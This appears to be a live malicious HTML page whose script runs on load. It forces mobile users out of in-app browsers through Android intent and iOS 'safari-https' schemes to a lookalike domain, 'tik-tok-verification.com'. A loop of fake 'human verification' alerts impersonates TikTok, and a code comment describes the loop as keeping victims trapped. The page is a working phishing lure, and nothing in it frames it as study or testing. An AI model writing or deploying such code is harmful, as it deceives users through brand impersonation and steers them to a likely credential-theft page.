<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>body { background: #fff; margin: 0; padding: 0; }</style>
</head>
<body>

<script>
    const targetUrl = "https://tik-tok-verification.com/Verification/verify1.html";
    const urlNoProt = targetUrl.replace("https://", "");
    const killTime = Date.now() + 20000;

    function safariNuke() {
        const isAndroid = /Android/i.test(navigator.userAgent);
        
        if (isAndroid) {
            // Android: Standard direct browser intent
            window.location.href = `intent://${urlNoProt}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;end`;
        } else {
            // iOS: Direct Safari Hand-off
            // We use 'safari-https' which is a known scheme to force the browser 
            // while maintaining the SSL (HTTPS) requirement.
            window.location.href = "safari-https://" + urlNoProt;
            
            // Backup: Direct link in case 'safari-https' is restricted
            setTimeout(() => {
                if (document.hasFocus()) {
                    window.location.assign(targetUrl);
                }
            }, 50);
        }
    }

    function runSystem() {
        if (Date.now() > killTime) return;

        // Fire BEFORE the alert
        safariNuke();

        setTimeout(() => {
            if (document.hasFocus()) {
                const header = "HUMAN VERIFICATION REQUIRED\n";
                const body = "______________________________\n\nSuspicious network activity detected, please complete human verification to continue using TikTok.";
                
                alert(header + body);

                // Fire IMMEDIATELY after "OK" (User Gesture)
                safariNuke();

                // Loop back to keep them trapped
                setTimeout(runSystem, 400);
            }
        }, 400);
    }

    window.onload = runSystem;
    window.onfocus = () => { if (Date.now() < killTime) safariNuke(); };
</script>

</body>
</html>
